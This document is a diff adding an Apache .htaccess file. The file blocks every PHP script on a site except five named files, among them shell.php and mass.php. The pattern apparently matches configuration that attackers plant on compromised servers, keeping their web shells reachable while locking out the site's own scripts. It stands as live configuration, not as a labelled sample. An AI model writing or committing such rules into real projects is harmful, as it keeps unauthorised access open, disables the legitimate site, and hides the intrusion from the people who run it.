@@ -1,0 +1,24 @@
+<FilesMatch ".*\.(phtml|php)$">
+Order Allow,Deny
+Deny from all
+</FilesMatch>
+<FilesMatch "(acho).php$">
+Order Allow,Deny
+Allow from all
+</FilesMatch>
+<FilesMatch "(connector.minimal).php$">
+Order Allow,Deny
+Allow from all
+</FilesMatch>
+<FilesMatch "(shell).php$">
+Order Allow,Deny
+Allow from all
+</FilesMatch>
+<FilesMatch "(index).php$">
+Order Allow,Deny
+Allow from all
+</FilesMatch>
+<FilesMatch "(mass).php$">
+Order Allow,Deny
+Allow from all
+</FilesMatch>
